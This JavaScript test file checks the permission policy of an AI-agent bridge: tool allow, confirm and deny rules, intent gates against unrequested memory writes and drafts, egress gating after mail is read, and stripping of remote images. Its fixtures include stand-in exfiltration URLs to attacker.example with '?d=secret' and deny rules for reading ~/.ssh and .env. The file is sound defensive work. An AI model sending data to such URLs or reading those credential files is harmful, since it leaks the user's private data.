import { test } from 'node:test'
import assert from 'node:assert/strict'

// No allowlist, so the connector check never interferes with these verdicts.
delete process.env.JARVIS_CONNECTORS
const p = await import('../bridge/policy.mjs')

const open = () => false
const DEFAULT = { allowWrites: false, allowMoney: false, confirm: true, toolBlocked: open }
const WRITES = { ...DEFAULT, allowWrites: true }
const MONEY = { ...WRITES, allowMoney: true }
const NO_CONFIRM = { ...DEFAULT, confirm: false }

// [tool, default, writes on, writes + money, confirmations off]
const TABLE = [
  // Built-ins
  ['WebSearch', 'allow', 'allow', 'allow', 'allow'],
  ['Bash', 'deny', 'allow', 'allow', 'deny'],
  ['Write', 'deny', 'allow', 'allow', 'deny'],
  ['SomeNewBuiltin', 'deny', 'allow', 'allow', 'deny'],
  // Mail: reads run, drafts run, sends are put to the user
  ['mcp__claude_ai_Gmail__search_threads', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__claude_ai_Gmail__create_draft', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__claude_ai_Gmail__send_message', 'confirm', 'allow', 'allow', 'deny'],
  ['mcp__protective__protective_get_inbox', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__protective__protective_create_draft', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__protective__protective_send_email', 'confirm', 'allow', 'allow', 'deny'],
  // Calendar
  ['mcp__claude_ai_Google_Calendar__list_events', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__claude_ai_Google_Calendar__create_event', 'confirm', 'allow', 'allow', 'deny'],
  // Money: never allowed outright, and only when JARVIS_ALLOW_MONEY is on
  ['mcp__claude_ai_Robinhood__get_portfolio', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__claude_ai_Robinhood__place_equity_order', 'deny', 'deny', 'confirm', 'deny'],
  ['mcp__claude_ai_PayPal__create_invoice', 'deny', 'deny', 'confirm', 'deny'],
  // No money word in the name, but a brokerage: still the money gate
  ['mcp__claude_ai_Robinhood__close_position', 'deny', 'deny', 'confirm', 'deny'],
  ['mcp__claude_ai_Intuit_QuickBooks__qbo_sales_update_settings', 'deny', 'deny', 'confirm', 'deny'],
  // Exemptions stay narrow
  ['mcp__claude_ai_Google_Drive__download_file_content', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__claude_ai_Sonos__play_track', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__claude_ai_Sonos__delete_playlist', 'confirm', 'allow', 'allow', 'deny'],
  ['mcp__claude_ai_Perplexity__perplexity_ask', 'allow', 'allow', 'allow', 'allow'],
  // The bridge's own servers
  ['mcp__jarvis_memory__remember', 'allow', 'allow', 'allow', 'allow'],
  ['mcp__jarvis_ui__ui_theme', 'allow', 'allow', 'allow', 'allow'],
]

for (const [tool, byDefault, withWrites, withMoney, noConfirm] of TABLE) {
  test(`${tool}: ${byDefault} / ${withWrites} / ${withMoney} / ${noConfirm}`, () => {
    assert.equal(p.decideTool(tool, DEFAULT), byDefault, 'default')
    assert.equal(p.decideTool(tool, WRITES), withWrites, 'writes on')
    assert.equal(p.decideTool(tool, MONEY), withMoney, 'writes + money on')
    assert.equal(p.decideTool(tool, NO_CONFIRM), noConfirm, 'confirmations off')
  })
}

test('a connector outside JARVIS_CONNECTORS is denied before any other rule', () => {
  const blocked = { ...MONEY, toolBlocked: () => true }
  assert.equal(p.decideTool('mcp__claude_ai_Gmail__search_threads', blocked), 'deny')
})

test('background readers get reads only: no drafts, files, shell, web or subagents', () => {
  for (const name of ['mcp__claude_ai_Gmail__search_threads', 'mcp__protective__protective_get_inbox']) {
    assert.equal(p.readOnlyTool(name, WRITES), true, name)
  }
  for (const name of [
    'mcp__protective__protective_create_draft', 'mcp__claude_ai_Gmail__create_draft',
    'WebFetch', 'WebSearch', 'Read', 'Glob', 'Grep', 'Bash', 'Task', 'Agent',
    'mcp__claude_ai_Gmail__send_message',
  ]) {
    assert.equal(p.readOnlyTool(name, MONEY), false, name)
  }
  for (const name of ['WebFetch', 'WebSearch', 'Read', 'Bash', 'Task', 'Agent']) {
    assert.ok(p.BACKGROUND_DISALLOWED.includes(name), `${name} removed from background sessions`)
  }
})

test('the conversation loses the shell and file tools unless writes are on', () => {
  const off = p.conversationDisallowed(DEFAULT)
  for (const name of ['Bash', 'Read', 'Glob', 'Grep']) assert.ok(off.includes(name), name)
  const on = p.conversationDisallowed(WRITES)
  assert.ok(!on.includes('Bash') && !on.includes('Read'))
  for (const rule of ['Read(~/.ssh/**)', 'Read(~/.jarvis/**)', 'Read(~/.claude.json)', 'Read(**/.env)']) {
    assert.ok(on.includes(rule), rule)
  }
})

test('remember is free when he asked for it, and put to him when he did not', () => {
  const remember = 'mcp__jarvis_memory__remember'
  assert.equal(p.intentGate(remember, 'allow', 'Remember that I take my coffee black', DEFAULT), 'allow')
  assert.equal(p.intentGate(remember, 'allow', "don't forget Sarah runs the NI programme", DEFAULT), 'allow')
  // Said nothing about remembering: the note came from something he read.
  assert.equal(p.intentGate(remember, 'allow', 'check my inbox', DEFAULT), 'confirm')
  assert.equal(p.intentGate(remember, 'allow', 'yes', DEFAULT), 'confirm')
  assert.equal(p.intentGate(remember, 'allow', 'check my inbox', NO_CONFIRM), 'deny')
})

test('a draft he did not ask for is shown to him before it is made', () => {
  for (const draft of ['mcp__protective__protective_create_draft', 'mcp__claude_ai_Gmail__create_draft']) {
    assert.equal(p.intentGate(draft, 'allow', 'draft a reply to Chris saying Thursday works', DEFAULT), 'allow', draft)
    assert.equal(p.intentGate(draft, 'allow', 'email Sarah the notes', DEFAULT), 'allow', draft)
    // "Yes" to a background alert's offer: the content came from the mail.
    assert.equal(p.intentGate(draft, 'allow', 'yes', DEFAULT), 'confirm', draft)
    assert.equal(p.intentGate(draft, 'allow', 'what is on my calendar', DEFAULT), 'confirm', draft)
  }
})

test('the intent gate only ever tightens a verdict', () => {
  assert.equal(p.intentGate('mcp__claude_ai_Gmail__send_message', 'confirm', 'send it', DEFAULT), 'confirm')
  assert.equal(p.intentGate('mcp__claude_ai_Robinhood__place_equity_order', 'deny', 'remember to buy', DEFAULT), 'deny')
  assert.equal(p.intentGate('mcp__claude_ai_Gmail__search_threads', 'allow', 'yes', DEFAULT), 'allow')
})

test('after his data is read, reaching an arbitrary address is put to him first', () => {
  const clean = { tainted: false }
  const read = { tainted: true }
  for (const name of ['WebFetch', 'mcp__jarvis_chrome__chrome_navigate', 'mcp__jarvis__probe_url']) {
    assert.equal(p.egressGate(name, 'allow', clean, DEFAULT), 'allow', `${name} before anything is read`)
    assert.equal(p.egressGate(name, 'allow', read, DEFAULT), 'confirm', `${name} after mail is read`)
    assert.equal(p.egressGate(name, 'allow', read, NO_CONFIRM), 'deny', `${name} with confirmations off`)
  }
  const page = { url: 'https://attacker.example/?d=notes' }
  assert.equal(p.egressGate('mcp__jarvis__blade', 'allow', { tainted: true, input: page }, DEFAULT), 'confirm')
  assert.equal(p.egressGate('mcp__jarvis__blade', 'allow', { tainted: true, input: { html: '<p>x</p>' } }, DEFAULT), 'allow')
  // Only ever tightens, and leaves everything else alone.
  assert.equal(p.egressGate('WebFetch', 'deny', read, DEFAULT), 'deny')
  assert.equal(p.egressGate('mcp__protective__protective_get_inbox', 'allow', read, DEFAULT), 'allow')
})

test('his own data taints the turn; the screen, his notes and the open web do not', () => {
  for (const name of ['mcp__protective__protective_get_inbox', 'mcp__claude_ai_Gmail__search_threads', 'mcp__claude_ai_Granola__get_meetings',
    'mcp__jarvis_files__read_local_page', 'mcp__jarvis_brief__get_brief', 'mcp__jarvis_chrome__chrome_page_text']) {
    assert.equal(p.bringsContent(name), true, name)
  }
  for (const name of ['ToolSearch', 'WebSearch', 'WebFetch', 'mcp__jarvis__display', 'mcp__jarvis_ui__ui_theme',
    'mcp__jarvis_memory__remember', 'mcp__claude_ai_Perplexity__perplexity_ask']) {
    assert.equal(p.bringsContent(name), false, name)
  }
})

test('remote media is taken out of panels; local and data images stay', () => {
  const html = '<img src="https://attacker.example/p.png?d=secret"><img src="data:image/png;base64,AAAA">' +
    '<div style="background:url(https://attacker.example/b?d=1)">x</div><a href="https://ok.example">link</a>'
  const r = p.stripRemoteMedia(html)
  assert.equal(r.removed, 3)
  assert.doesNotMatch(r.html, /attacker|ok\.example/)
  assert.match(r.html, /data:image\/png/)
  const blade = p.withoutRemoteMedia('mcp__jarvis__blade', { kind: 'gallery', images: ['https://x.example/a.jpg', '/img/local.png'] })
  assert.deepEqual(blade.input.images, ['/img/local.png'])
  assert.equal(blade.removed, 1)
  const other = p.withoutRemoteMedia('mcp__protective__protective_create_draft', { body: '<img src="https://x/y">' })
  assert.equal(other.removed, 0)
})
